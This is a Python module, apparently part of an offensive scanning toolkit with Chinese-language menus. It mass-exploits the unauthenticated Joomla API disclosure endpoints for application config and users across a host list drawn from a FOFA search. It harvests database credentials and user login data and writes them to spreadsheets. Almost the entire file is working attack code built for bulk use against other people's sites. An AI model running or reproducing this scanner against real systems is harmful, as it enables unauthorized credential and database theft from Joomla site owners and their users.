
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: product="Joomla"
        1. Joomla application未授权利用, 批量获取数据库信息
        2. Joomla application未授权利用, 批量获取登录信息
    x. 退出
    ''')

def vul_application_get_db_info(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    body = ''
    method = "GET"
    path = "/api/index.php/v1/config/application?public=true"
    notes = ""
    return (url, method, headers, body, path, notes)

def vul_application_get_login_info(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    payload = ''
    method = "GET"
    path = "/api/index.php/v1/users?public=true"
    notes = ""
    return (url, method, headers, payload, path, notes)


def run():
    OUTDIR = "result/Joomla"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_application_get_db_info(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Joomla db_info.xlsx")

    elif num == 2:
        data = []
        for url in li:
            item = vul_application_get_login_info(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Joomla login_info.xlsx")
        
    else:
        print('bye..')


